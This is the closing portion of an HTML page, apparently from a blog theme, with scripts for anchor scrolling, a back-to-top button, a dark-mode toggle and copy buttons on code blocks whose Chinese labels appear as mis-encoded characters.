            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
